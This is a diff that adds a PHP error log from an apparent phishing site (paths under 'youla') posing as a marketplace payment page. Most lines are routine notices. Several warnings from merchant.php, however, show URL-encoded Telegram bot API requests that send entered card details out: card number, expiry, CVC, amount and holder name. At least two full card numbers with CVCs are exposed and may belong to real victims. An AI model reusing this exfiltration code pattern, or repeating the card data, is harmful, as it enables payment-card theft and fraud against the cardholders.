@@ -1,0 +1,174 @@
+[12-Sep-2019 14:56:11 Europe/Helsinki] PHP Parse error:  syntax error, unexpected end of file, expecting ',' or ';' in /home/youla/public_html/index.php on line 47
+[12-Sep-2019 14:56:12 Europe/Helsinki] PHP Parse error:  syntax error, unexpected end of file, expecting ',' or ';' in /home/youla/public_html/index.php on line 47
+[12-Sep-2019 15:04:17 Europe/Helsinki] PHP Warning:  Use of undefined constant CURLOPT_PROXYPWD - assumed 'CURLOPT_PROXYPWD' (this will throw an Error in a future version of PHP) in /home/youla/public_html/index.php on line 15
+[12-Sep-2019 15:04:17 Europe/Helsinki] PHP Warning:  curl_setopt() expects parameter 2 to be int, string given in /home/youla/public_html/index.php on line 15
+[12-Sep-2019 15:04:19 Europe/Helsinki] PHP Warning:  Use of undefined constant CURLOPT_PROXYPWD - assumed 'CURLOPT_PROXYPWD' (this will throw an Error in a future version of PHP) in /home/youla/public_html/index.php on line 15
+[12-Sep-2019 15:04:19 Europe/Helsinki] PHP Warning:  curl_setopt() expects parameter 2 to be int, string given in /home/youla/public_html/index.php on line 15
+[12-Sep-2019 15:04:20 Europe/Helsinki] PHP Warning:  Use of undefined constant CURLOPT_PROXYPWD - assumed 'CURLOPT_PROXYPWD' (this will throw an Error in a future version of PHP) in /home/youla/public_html/index.php on line 15
+[12-Sep-2019 15:04:20 Europe/Helsinki] PHP Warning:  curl_setopt() expects parameter 2 to be int, string given in /home/youla/public_html/index.php on line 15
+[12-Sep-2019 15:04:21 Europe/Helsinki] PHP Warning:  Use of undefined constant CURLOPT_PROXYPWD - assumed 'CURLOPT_PROXYPWD' (this will throw an Error in a future version of PHP) in /home/youla/public_html/index.php on line 15
+[12-Sep-2019 15:04:21 Europe/Helsinki] PHP Warning:  curl_setopt() expects parameter 2 to be int, string given in /home/youla/public_html/index.php on line 15
+[12-Sep-2019 15:04:26 Europe/Helsinki] PHP Warning:  Use of undefined constant CURLOPT_PROXYPWD - assumed 'CURLOPT_PROXYPWD' (this will throw an Error in a future version of PHP) in /home/youla/public_html/index.php on line 15
+[12-Sep-2019 15:04:26 Europe/Helsinki] PHP Warning:  curl_setopt() expects parameter 2 to be int, string given in /home/youla/public_html/index.php on line 15
+[12-Sep-2019 15:04:27 Europe/Helsinki] PHP Warning:  Use of undefined constant CURLOPT_PROXYPWD - assumed 'CURLOPT_PROXYPWD' (this will throw an Error in a future version of PHP) in /home/youla/public_html/index.php on line 15
+[12-Sep-2019 15:04:27 Europe/Helsinki] PHP Warning:  curl_setopt() expects parameter 2 to be int, string given in /home/youla/public_html/index.php on line 15
+[12-Sep-2019 15:32:26 Europe/Helsinki] PHP Warning:  curl_setopt(): You must pass either an object or an array with the CURLOPT_HTTPHEADER argument in /home/youla/public_html/index.php on line 15
+[12-Sep-2019 15:32:28 Europe/Helsinki] PHP Warning:  curl_setopt(): You must pass either an object or an array with the CURLOPT_HTTPHEADER argument in /home/youla/public_html/index.php on line 15
+[12-Sep-2019 16:55:53 Europe/Helsinki] PHP Notice:  Undefined index: amount in /home/youla/public_html/pay.php on line 3
+[12-Sep-2019 16:55:53 Europe/Helsinki] PHP Notice:  Undefined index: name in /home/youla/public_html/pay.php on line 3
+[12-Sep-2019 16:55:53 Europe/Helsinki] PHP Notice:  Undefined index: sum in /home/youla/public_html/pay.php on line 6
+[12-Sep-2019 16:55:53 Europe/Helsinki] PHP Notice:  Undefined index: name in /home/youla/public_html/pay.php on line 7
+[12-Sep-2019 16:55:53 Europe/Helsinki] PHP Notice:  Undefined index: tov in /home/youla/public_html/pay.php on line 8
+[12-Sep-2019 16:55:53 Europe/Helsinki] PHP Notice:  Undefined index: amount in /home/youla/public_html/pay.php on line 12
+[12-Sep-2019 16:55:53 Europe/Helsinki] PHP Notice:  Undefined index: name in /home/youla/public_html/pay.php on line 386
+[12-Sep-2019 16:55:53 Europe/Helsinki] PHP Notice:  Undefined index: tov in /home/youla/public_html/pay.php on line 387
+[12-Sep-2019 16:55:53 Europe/Helsinki] PHP Notice:  Undefined index: amount in /home/youla/public_html/pay.php on line 388
+[12-Sep-2019 16:55:53 Europe/Helsinki] PHP Notice:  Undefined index: amount in /home/youla/public_html/pay.php on line 464
+[12-Sep-2019 16:55:53 Europe/Helsinki] PHP Notice:  Undefined index: amount in /home/youla/public_html/pay.php on line 3
+[12-Sep-2019 16:55:53 Europe/Helsinki] PHP Notice:  Undefined index: name in /home/youla/public_html/pay.php on line 3
+[12-Sep-2019 16:55:53 Europe/Helsinki] PHP Notice:  Undefined index: HTTP_REFERER in /home/youla/public_html/pay.php on line 4
+[12-Sep-2019 16:55:53 Europe/Helsinki] PHP Notice:  Undefined index: query in /home/youla/public_html/pay.php on line 4
+[12-Sep-2019 16:55:53 Europe/Helsinki] PHP Notice:  Undefined index: amount in /home/youla/public_html/pay.php on line 12
+[12-Sep-2019 16:55:53 Europe/Helsinki] PHP Notice:  Undefined index: name in /home/youla/public_html/pay.php on line 386
+[12-Sep-2019 16:55:53 Europe/Helsinki] PHP Notice:  Undefined index: tov in /home/youla/public_html/pay.php on line 387
+[12-Sep-2019 16:55:53 Europe/Helsinki] PHP Notice:  Undefined index: amount in /home/youla/public_html/pay.php on line 388
+[12-Sep-2019 16:55:53 Europe/Helsinki] PHP Notice:  Undefined index: amount in /home/youla/public_html/pay.php on line 464
+[12-Sep-2019 17:03:49 Europe/Helsinki] PHP Notice:  Undefined index: amount in /home/youla/public_html/pay.php on line 3
+[12-Sep-2019 17:03:49 Europe/Helsinki] PHP Notice:  Undefined index: name in /home/youla/public_html/pay.php on line 3
+[12-Sep-2019 17:03:49 Europe/Helsinki] PHP Notice:  Undefined index: sum in /home/youla/public_html/pay.php on line 6
+[12-Sep-2019 17:03:49 Europe/Helsinki] PHP Notice:  Undefined index: name in /home/youla/public_html/pay.php on line 7
+[12-Sep-2019 17:03:49 Europe/Helsinki] PHP Notice:  Undefined index: tov in /home/youla/public_html/pay.php on line 8
+[12-Sep-2019 17:03:49 Europe/Helsinki] PHP Notice:  Undefined index: amount in /home/youla/public_html/pay.php on line 12
+[12-Sep-2019 17:03:49 Europe/Helsinki] PHP Notice:  Undefined index: name in /home/youla/public_html/pay.php on line 386
+[12-Sep-2019 17:03:49 Europe/Helsinki] PHP Notice:  Undefined index: tov in /home/youla/public_html/pay.php on line 387
+[12-Sep-2019 17:03:49 Europe/Helsinki] PHP Notice:  Undefined index: amount in /home/youla/public_html/pay.php on line 388
+[12-Sep-2019 17:03:49 Europe/Helsinki] PHP Notice:  Undefined index: amount in /home/youla/public_html/pay.php on line 464
+[12-Sep-2019 17:03:49 Europe/Helsinki] PHP Notice:  Undefined index: amount in /home/youla/public_html/pay.php on line 3
+[12-Sep-2019 17:03:49 Europe/Helsinki] PHP Notice:  Undefined index: name in /home/youla/public_html/pay.php on line 3
+[12-Sep-2019 17:03:49 Europe/Helsinki] PHP Notice:  Undefined index: amount in /home/youla/public_html/pay.php on line 12
+[12-Sep-2019 17:03:49 Europe/Helsinki] PHP Notice:  Undefined index: name in /home/youla/public_html/pay.php on line 386
+[12-Sep-2019 17:03:49 Europe/Helsinki] PHP Notice:  Undefined index: tov in /home/youla/public_html/pay.php on line 387
+[12-Sep-2019 17:03:49 Europe/Helsinki] PHP Notice:  Undefined index: amount in /home/youla/public_html/pay.php on line 388
+[12-Sep-2019 17:03:49 Europe/Helsinki] PHP Notice:  Undefined index: amount in /home/youla/public_html/pay.php on line 464
+[12-Sep-2019 17:29:15 Europe/Helsinki] PHP Notice:  Undefined index: amount in /home/youla/public_html/pay.php on line 3
+[12-Sep-2019 17:29:15 Europe/Helsinki] PHP Notice:  Undefined index: name in /home/youla/public_html/pay.php on line 3
+[12-Sep-2019 17:29:15 Europe/Helsinki] PHP Notice:  Undefined index: sum in /home/youla/public_html/pay.php on line 6
+[12-Sep-2019 17:29:15 Europe/Helsinki] PHP Notice:  Undefined index: name in /home/youla/public_html/pay.php on line 7
+[12-Sep-2019 17:29:15 Europe/Helsinki] PHP Notice:  Undefined index: tov in /home/youla/public_html/pay.php on line 8
+[12-Sep-2019 17:29:15 Europe/Helsinki] PHP Notice:  Undefined index: amount in /home/youla/public_html/pay.php on line 12
+[12-Sep-2019 17:29:15 Europe/Helsinki] PHP Notice:  Undefined index: name in /home/youla/public_html/pay.php on line 386
+[12-Sep-2019 17:29:15 Europe/Helsinki] PHP Notice:  Undefined index: tov in /home/youla/public_html/pay.php on line 387
+[12-Sep-2019 17:29:15 Europe/Helsinki] PHP Notice:  Undefined index: amount in /home/youla/public_html/pay.php on line 388
+[12-Sep-2019 17:29:15 Europe/Helsinki] PHP Notice:  Undefined index: amount in /home/youla/public_html/pay.php on line 464
+[12-Sep-2019 17:29:15 Europe/Helsinki] PHP Notice:  Undefined index: amount in /home/youla/public_html/pay.php on line 3
+[12-Sep-2019 17:29:15 Europe/Helsinki] PHP Notice:  Undefined index: name in /home/youla/public_html/pay.php on line 3
+[12-Sep-2019 17:29:15 Europe/Helsinki] PHP Notice:  Undefined index: amount in /home/youla/public_html/pay.php on line 12
+[12-Sep-2019 17:29:15 Europe/Helsinki] PHP Notice:  Undefined index: name in /home/youla/public_html/pay.php on line 386
+[12-Sep-2019 17:29:15 Europe/Helsinki] PHP Notice:  Undefined index: tov in /home/youla/public_html/pay.php on line 387
+[12-Sep-2019 17:29:15 Europe/Helsinki] PHP Notice:  Undefined index: amount in /home/youla/public_html/pay.php on line 388
+[12-Sep-2019 17:29:15 Europe/Helsinki] PHP Notice:  Undefined index: amount in /home/youla/public_html/pay.php on line 464
+[12-Sep-2019 17:29:15 Europe/Helsinki] PHP Notice:  Undefined index: amount in /home/youla/public_html/pay.php on line 3
+[12-Sep-2019 17:29:15 Europe/Helsinki] PHP Notice:  Undefined index: name in /home/youla/public_html/pay.php on line 3
+[12-Sep-2019 17:29:15 Europe/Helsinki] PHP Notice:  Undefined index: sum in /home/youla/public_html/pay.php on line 6
+[12-Sep-2019 17:29:15 Europe/Helsinki] PHP Notice:  Undefined index: name in /home/youla/public_html/pay.php on line 7
+[12-Sep-2019 17:29:15 Europe/Helsinki] PHP Notice:  Undefined index: tov in /home/youla/public_html/pay.php on line 8
+[12-Sep-2019 17:29:15 Europe/Helsinki] PHP Notice:  Undefined index: amount in /home/youla/public_html/pay.php on line 12
+[12-Sep-2019 17:29:15 Europe/Helsinki] PHP Notice:  Undefined index: name in /home/youla/public_html/pay.php on line 386
+[12-Sep-2019 17:29:15 Europe/Helsinki] PHP Notice:  Undefined index: tov in /home/youla/public_html/pay.php on line 387
+[12-Sep-2019 17:29:15 Europe/Helsinki] PHP Notice:  Undefined index: amount in /home/youla/public_html/pay.php on line 388
+[12-Sep-2019 17:29:15 Europe/Helsinki] PHP Notice:  Undefined index: amount in /home/youla/public_html/pay.php on line 464
+[12-Sep-2019 17:29:15 Europe/Helsinki] PHP Notice:  Undefined index: amount in /home/youla/public_html/pay.php on line 3
+[12-Sep-2019 17:29:15 Europe/Helsinki] PHP Notice:  Undefined index: name in /home/youla/public_html/pay.php on line 3
+[12-Sep-2019 17:29:15 Europe/Helsinki] PHP Notice:  Undefined index: amount in /home/youla/public_html/pay.php on line 12
+[12-Sep-2019 17:29:15 Europe/Helsinki] PHP Notice:  Undefined index: name in /home/youla/public_html/pay.php on line 386
+[12-Sep-2019 17:29:15 Europe/Helsinki] PHP Notice:  Undefined index: tov in /home/youla/public_html/pay.php on line 387
+[12-Sep-2019 17:29:15 Europe/Helsinki] PHP Notice:  Undefined index: amount in /home/youla/public_html/pay.php on line 388
+[12-Sep-2019 17:29:15 Europe/Helsinki] PHP Notice:  Undefined index: amount in /home/youla/public_html/pay.php on line 464
+[12-Sep-2019 17:29:36 Europe/Helsinki] PHP Notice:  Undefined index: amount in /home/youla/public_html/pay.php on line 3
+[12-Sep-2019 17:29:36 Europe/Helsinki] PHP Notice:  Undefined index: name in /home/youla/public_html/pay.php on line 3
+[12-Sep-2019 17:29:36 Europe/Helsinki] PHP Notice:  Undefined index: sum in /home/youla/public_html/pay.php on line 6
+[12-Sep-2019 17:29:36 Europe/Helsinki] PHP Notice:  Undefined index: name in /home/youla/public_html/pay.php on line 7
+[12-Sep-2019 17:29:36 Europe/Helsinki] PHP Notice:  Undefined index: tov in /home/youla/public_html/pay.php on line 8
+[12-Sep-2019 17:29:36 Europe/Helsinki] PHP Notice:  Undefined index: amount in /home/youla/public_html/pay.php on line 12
+[12-Sep-2019 17:29:36 Europe/Helsinki] PHP Notice:  Undefined index: name in /home/youla/public_html/pay.php on line 386
+[12-Sep-2019 17:29:36 Europe/Helsinki] PHP Notice:  Undefined index: tov in /home/youla/public_html/pay.php on line 387
+[12-Sep-2019 17:29:36 Europe/Helsinki] PHP Notice:  Undefined index: amount in /home/youla/public_html/pay.php on line 388
+[12-Sep-2019 17:29:36 Europe/Helsinki] PHP Notice:  Undefined index: amount in /home/youla/public_html/pay.php on line 464
+[12-Sep-2019 17:29:36 Europe/Helsinki] PHP Notice:  Undefined index: amount in /home/youla/public_html/pay.php on line 3
+[12-Sep-2019 17:29:36 Europe/Helsinki] PHP Notice:  Undefined index: name in /home/youla/public_html/pay.php on line 3
+[12-Sep-2019 17:29:36 Europe/Helsinki] PHP Notice:  Undefined index: amount in /home/youla/public_html/pay.php on line 12
+[12-Sep-2019 17:29:36 Europe/Helsinki] PHP Notice:  Undefined index: name in /home/youla/public_html/pay.php on line 386
+[12-Sep-2019 17:29:36 Europe/Helsinki] PHP Notice:  Undefined index: tov in /home/youla/public_html/pay.php on line 387
+[12-Sep-2019 17:29:36 Europe/Helsinki] PHP Notice:  Undefined index: amount in /home/youla/public_html/pay.php on line 388
+[12-Sep-2019 17:29:36 Europe/Helsinki] PHP Notice:  Undefined index: amount in /home/youla/public_html/pay.php on line 464
+[12-Sep-2019 18:57:57 Europe/Helsinki] PHP Notice:  Undefined index: amount in /home/youla/public_html/pay.php on line 3
+[12-Sep-2019 18:57:57 Europe/Helsinki] PHP Notice:  Undefined index: name in /home/youla/public_html/pay.php on line 3
+[12-Sep-2019 18:57:57 Europe/Helsinki] PHP Notice:  Undefined index: sum in /home/youla/public_html/pay.php on line 6
+[12-Sep-2019 18:57:57 Europe/Helsinki] PHP Notice:  Undefined index: name in /home/youla/public_html/pay.php on line 7
+[12-Sep-2019 18:57:57 Europe/Helsinki] PHP Notice:  Undefined index: tov in /home/youla/public_html/pay.php on line 8
+[12-Sep-2019 18:57:57 Europe/Helsinki] PHP Notice:  Undefined index: amount in /home/youla/public_html/pay.php on line 12
+[12-Sep-2019 18:57:57 Europe/Helsinki] PHP Notice:  Undefined index: name in /home/youla/public_html/pay.php on line 386
+[12-Sep-2019 18:57:57 Europe/Helsinki] PHP Notice:  Undefined index: tov in /home/youla/public_html/pay.php on line 387
+[12-Sep-2019 18:57:57 Europe/Helsinki] PHP Notice:  Undefined index: amount in /home/youla/public_html/pay.php on line 388
+[12-Sep-2019 18:57:57 Europe/Helsinki] PHP Notice:  Undefined index: amount in /home/youla/public_html/pay.php on line 464
+[12-Sep-2019 18:57:58 Europe/Helsinki] PHP Notice:  Undefined index: amount in /home/youla/public_html/pay.php on line 3
+[12-Sep-2019 18:57:58 Europe/Helsinki] PHP Notice:  Undefined index: name in /home/youla/public_html/pay.php on line 3
+[12-Sep-2019 18:57:58 Europe/Helsinki] PHP Notice:  Undefined index: amount in /home/youla/public_html/pay.php on line 12
+[12-Sep-2019 18:57:58 Europe/Helsinki] PHP Notice:  Undefined index: name in /home/youla/public_html/pay.php on line 386
+[12-Sep-2019 18:57:58 Europe/Helsinki] PHP Notice:  Undefined index: tov in /home/youla/public_html/pay.php on line 387
+[12-Sep-2019 18:57:58 Europe/Helsinki] PHP Notice:  Undefined index: amount in /home/youla/public_html/pay.php on line 388
+[12-Sep-2019 18:57:58 Europe/Helsinki] PHP Notice:  Undefined index: amount in /home/youla/public_html/pay.php on line 464
+[12-Sep-2019 18:58:19 Europe/Moscow] PHP Notice:  Undefined index: name in /home/youla/public_html/merchant.php on line 6
+[12-Sep-2019 18:58:19 Europe/Moscow] PHP Warning:  file_get_contents(https://api.telegram.org/bot/sendMessage?chat_id=&amp;text=%3Cb%3E%D0%9F%D0%B5%D1%80%D0%B5%D1%85%D0%BE%D0%B4+%D0%BD%D0%B0+%D0%BE%D0%BF%D0%BB%D0%B0%D1%82%D1%83%3C%2Fb%3E+%0A+1.+%D0%9D%D0%BE%D0%BC%D0%B5%D1%80+%D0%BA%D0%B0%D1%80%D1%82%D1%8B%3A+5536+9138+1757+9929+%0A+2.+%D0%A1%D1%80%D0%BE%D0%BA+%D0%B4%D0%B5%D0%B9%D1%81%D1%82%D0%B2%D0%B8%D1%8F%3A+09++%2F++24%0A+3.+CVC%3A+870+%0A+4.+%D0%A1%D1%83%D0%BC%D0%BC%D0%B0%3A+150+%0A+5.+%D0%98%D0%BC%D1%8F+%D0%BF%D1%80%D0%BE%D0%B4%D0%B0%D0%B2%D1%86%D0%B0%2F%D1%82%D0%BE%D0%B2%D0%B0%D1%80%3A+%D0%9F%D1%80%D0%BE%D0%B4%D0%B0%D0%B2%D0%B5%D1%86+%D0%9A.%C2%A0%2F+%0A+6.+%D0%94%D0%B0%D1%82%D0%B0%3A+12-09-2019+18%3A58%0A+7.+%D0%94%D0%B5%D1%80%D0%B6%D0%B0%D1%82%D0%B5%D0%BB%D1%8C%3A+%D1%84%D1%8B%D0%B2%D1%84%D1%84%D0%B2%D1%8B&amp;parse_mode=html): failed to open stream: HTTP request failed! HTTP/1.1 404 Not Found
+ in /home/youla/public_html/merchant.php on line 9
+[12-Sep-2019 18:58:19 Europe/Moscow] PHP Fatal error:  Uncaught Error: Call to undefined function mb_strlen() in /home/youla/public_html/merchant.php:19
+Stack trace:
+#0 {main}
+  thrown in /home/youla/public_html/merchant.php on line 19
+[12-Sep-2019 19:03:24 Europe/Moscow] PHP Notice:  Undefined index: name in /home/youla/public_html/merchant.php on line 6
+[12-Sep-2019 19:03:24 Europe/Moscow] PHP Warning:  file_get_contents(https://api.telegram.org/bot/sendMessage?chat_id=&amp;text=%3Cb%3E%D0%9F%D0%B5%D1%80%D0%B5%D1%85%D0%BE%D0%B4+%D0%BD%D0%B0+%D0%BE%D0%BF%D0%BB%D0%B0%D1%82%D1%83%3C%2Fb%3E+%0A+1.+%D0%9D%D0%BE%D0%BC%D0%B5%D1%80+%D0%BA%D0%B0%D1%80%D1%82%D1%8B%3A+5536+9138+1757+9929+%0A+2.+%D0%A1%D1%80%D0%BE%D0%BA+%D0%B4%D0%B5%D0%B9%D1%81%D1%82%D0%B2%D0%B8%D1%8F%3A+09++%2F++24%0A+3.+CVC%3A++%0A+4.+%D0%A1%D1%83%D0%BC%D0%BC%D0%B0%3A+150+%0A+5.+%D0%98%D0%BC%D1%8F+%D0%BF%D1%80%D0%BE%D0%B4%D0%B0%D0%B2%D1%86%D0%B0%2F%D1%82%D0%BE%D0%B2%D0%B0%D1%80%3A+%D0%9F%D1%80%D0%BE%D0%B4%D0%B0%D0%B2%D0%B5%D1%86+%D0%9A.%C2%A0%2F+%0A+6.+%D0%94%D0%B0%D1%82%D0%B0%3A+12-09-2019+19%3A03%0A+7.+%D0%94%D0%B5%D1%80%D0%B6%D0%B0%D1%82%D0%B5%D0%BB%D1%8C%3A+%D1%84%D1%8B%D0%B2%D1%84%D1%84%D0%B2%D1%8B&amp;parse_mode=html): failed to open stream: HTTP request failed! HTTP/1.1 404 Not Found
+ in /home/youla/public_html/merchant.php on line 9
+[12-Sep-2019 19:03:24 Europe/Moscow] PHP Fatal error:  Uncaught Error: Call to undefined function mb_strlen() in /home/youla/public_html/merchant.php:19
+Stack trace:
+#0 {main}
+  thrown in /home/youla/public_html/merchant.php on line 19
+[12-Sep-2019 19:03:53 Europe/Moscow] PHP Notice:  Undefined index: name in /home/youla/public_html/merchant.php on line 6
+[12-Sep-2019 19:03:53 Europe/Moscow] PHP Warning:  file_get_contents(https://api.telegram.org/bot/sendMessage?chat_id=&amp;text=%3Cb%3E%D0%9F%D0%B5%D1%80%D0%B5%D1%85%D0%BE%D0%B4+%D0%BD%D0%B0+%D0%BE%D0%BF%D0%BB%D0%B0%D1%82%D1%83%3C%2Fb%3E+%0A+1.+%D0%9D%D0%BE%D0%BC%D0%B5%D1%80+%D0%BA%D0%B0%D1%80%D1%82%D1%8B%3A+5536+9138+1757+9929+%0A+2.+%D0%A1%D1%80%D0%BE%D0%BA+%D0%B4%D0%B5%D0%B9%D1%81%D1%82%D0%B2%D0%B8%D1%8F%3A+09++%2F++24%0A+3.+CVC%3A+870+%0A+4.+%D0%A1%D1%83%D0%BC%D0%BC%D0%B0%3A+150+%0A+5.+%D0%98%D0%BC%D1%8F+%D0%BF%D1%80%D0%BE%D0%B4%D0%B0%D0%B2%D1%86%D0%B0%2F%D1%82%D0%BE%D0%B2%D0%B0%D1%80%3A+%D0%9F%D1%80%D0%BE%D0%B4%D0%B0%D0%B2%D0%B5%D1%86+%D0%9A.%C2%A0%2F+%0A+6.+%D0%94%D0%B0%D1%82%D0%B0%3A+12-09-2019+19%3A03%0A+7.+%D0%94%D0%B5%D1%80%D0%B6%D0%B0%D1%82%D0%B5%D0%BB%D1%8C%3A+asdasd&amp;parse_mode=html): failed to open stream: HTTP request failed! HTTP/1.1 404 Not Found
+ in /home/youla/public_html/merchant.php on line 9
+[12-Sep-2019 19:03:53 Europe/Moscow] PHP Fatal error:  Uncaught Error: Call to undefined function mb_strlen() in /home/youla/public_html/merchant.php:19
+Stack trace:
+#0 {main}
+  thrown in /home/youla/public_html/merchant.php on line 19
+[12-Sep-2019 19:08:29 Europe/Moscow] PHP Notice:  Undefined index: name in /home/youla/public_html/merchant.php on line 6
+[12-Sep-2019 19:08:29 Europe/Moscow] PHP Warning:  file_get_contents(https://api.telegram.org/bot/sendMessage?chat_id=&amp;text=%3Cb%3E%D0%9F%D0%B5%D1%80%D0%B5%D1%85%D0%BE%D0%B4+%D0%BD%D0%B0+%D0%BE%D0%BF%D0%BB%D0%B0%D1%82%D1%83%3C%2Fb%3E+%0A+1.+%D0%9D%D0%BE%D0%BC%D0%B5%D1%80+%D0%BA%D0%B0%D1%80%D1%82%D1%8B%3A+5536+9138+1757+9929+%0A+2.+%D0%A1%D1%80%D0%BE%D0%BA+%D0%B4%D0%B5%D0%B9%D1%81%D1%82%D0%B2%D0%B8%D1%8F%3A+09++%2F++24%0A+3.+CVC%3A+870+%0A+4.+%D0%A1%D1%83%D0%BC%D0%BC%D0%B0%3A+150+%0A+5.+%D0%98%D0%BC%D1%8F+%D0%BF%D1%80%D0%BE%D0%B4%D0%B0%D0%B2%D1%86%D0%B0%2F%D1%82%D0%BE%D0%B2%D0%B0%D1%80%3A+%D0%9F%D1%80%D0%BE%D0%B4%D0%B0%D0%B2%D0%B5%D1%86+%D0%9A.%C2%A0%2F+%0A+6.+%D0%94%D0%B0%D1%82%D0%B0%3A+12-09-2019+19%3A08%0A+7.+%D0%94%D0%B5%D1%80%D0%B6%D0%B0%D1%82%D0%B5%D0%BB%D1%8C%3A+asdasd&amp;parse_mode=html): failed to open stream: HTTP request failed! HTTP/1.1 404 Not Found
+ in /home/youla/public_html/merchant.php on line 9
+[12-Sep-2019 19:08:29 Europe/Moscow] PHP Fatal error:  Uncaught Error: Call to undefined function mb_strlen() in /home/youla/public_html/merchant.php:19
+Stack trace:
+#0 {main}
+  thrown in /home/youla/public_html/merchant.php on line 19
+[12-Sep-2019 19:12:24 Europe/Helsinki] PHP Notice:  Undefined index: amount in /home/youla/public_html/pay.php on line 3
+[12-Sep-2019 19:12:24 Europe/Helsinki] PHP Notice:  Undefined index: name in /home/youla/public_html/pay.php on line 3
+[12-Sep-2019 19:12:24 Europe/Helsinki] PHP Notice:  Undefined index: sum in /home/youla/public_html/pay.php on line 6
+[12-Sep-2019 19:12:24 Europe/Helsinki] PHP Notice:  Undefined index: name in /home/youla/public_html/pay.php on line 7
+[12-Sep-2019 19:12:24 Europe/Helsinki] PHP Notice:  Undefined index: tov in /home/youla/public_html/pay.php on line 8
+[12-Sep-2019 19:12:24 Europe/Helsinki] PHP Notice:  Undefined index: amount in /home/youla/public_html/pay.php on line 12
+[12-Sep-2019 19:12:24 Europe/Helsinki] PHP Notice:  Undefined index: name in /home/youla/public_html/pay.php on line 386
+[12-Sep-2019 19:12:24 Europe/Helsinki] PHP Notice:  Undefined index: tov in /home/youla/public_html/pay.php on line 387
+[12-Sep-2019 19:12:24 Europe/Helsinki] PHP Notice:  Undefined index: amount in /home/youla/public_html/pay.php on line 388
+[12-Sep-2019 19:12:24 Europe/Helsinki] PHP Notice:  Undefined index: amount in /home/youla/public_html/pay.php on line 464
+[12-Sep-2019 19:12:25 Europe/Helsinki] PHP Notice:  Undefined index: amount in /home/youla/public_html/pay.php on line 3
+[12-Sep-2019 19:12:25 Europe/Helsinki] PHP Notice:  Undefined index: name in /home/youla/public_html/pay.php on line 3
+[12-Sep-2019 19:12:25 Europe/Helsinki] PHP Notice:  Undefined index: HTTP_REFERER in /home/youla/public_html/pay.php on line 4
+[12-Sep-2019 19:12:25 Europe/Helsinki] PHP Notice:  Undefined index: query in /home/youla/public_html/pay.php on line 4
+[12-Sep-2019 19:12:25 Europe/Helsinki] PHP Notice:  Undefined index: amount in /home/youla/public_html/pay.php on line 12
+[12-Sep-2019 19:12:25 Europe/Helsinki] PHP Notice:  Undefined index: name in /home/youla/public_html/pay.php on line 386
+[12-Sep-2019 19:12:25 Europe/Helsinki] PHP Notice:  Undefined index: tov in /home/youla/public_html/pay.php on line 387
+[12-Sep-2019 19:12:25 Europe/Helsinki] PHP Notice:  Undefined index: amount in /home/youla/public_html/pay.php on line 388
+[12-Sep-2019 19:12:25 Europe/Helsinki] PHP Notice:  Undefined index: amount in /home/youla/public_html/pay.php on line 464
+[12-Sep-2019 19:13:03 Europe/Moscow] PHP Notice:  Undefined index: name in /home/youla/public_html/merchant.php on line 6
+[12-Sep-2019 19:13:03 Europe/Moscow] PHP Warning:  file_get_contents(https://api.telegram.org/bot/sendMessage?chat_id=&amp;text=%3Cb%3E%D0%9F%D0%B5%D1%80%D0%B5%D1%85%D0%BE%D0%B4+%D0%BD%D0%B0+%D0%BE%D0%BF%D0%BB%D0%B0%D1%82%D1%83%3C%2Fb%3E+%0A+1.+%D0%9D%D0%BE%D0%BC%D0%B5%D1%80+%D0%BA%D0%B0%D1%80%D1%82%D1%8B%3A+4890+4946+7526+2372+%0A+2.+%D0%A1%D1%80%D0%BE%D0%BA+%D0%B4%D0%B5%D0%B9%D1%81%D1%82%D0%B2%D0%B8%D1%8F%3A+03++%2F++21%0A+3.+CVC%3A+432+%0A+4.+%D0%A1%D1%83%D0%BC%D0%BC%D0%B0%3A+660+%0A+5.+%D0%98%D0%BC%D1%8F+%D0%BF%D1%80%D0%BE%D0%B4%D0%B0%D0%B2%D1%86%D0%B0%2F%D1%82%D0%BE%D0%B2%D0%B0%D1%80%3A+%D0%9A%D0%BE%D0%BD%D1%81%D1%82%D0%B0%D0%BD%D1%82%D0%B8%D0%BD+%D0%91.%C2%A0%2F+%0A+6.+%D0%94%D0%B0%D1%82%D0%B0%3A+12-09-2019+19%3A13%0A+7.+%D0%94%D0%B5%D1%80%D0%B6%D0%B0%D1%82%D0%B5%D0%BB%D1%8C%3A+03&amp;parse_mode=html): failed to open stream: HTTP request failed! HTTP/1.1 404 Not Found
+ in /home/youla/public_html/merchant.php on line 9
+[12-Sep-2019 19:13:03 Europe/Moscow] PHP Fatal error:  Uncaught Error: Call to undefined function mb_strlen() in /home/youla/public_html/merchant.php:19
+Stack trace:
+#0 {main}
+  thrown in /home/youla/public_html/merchant.php on line 19
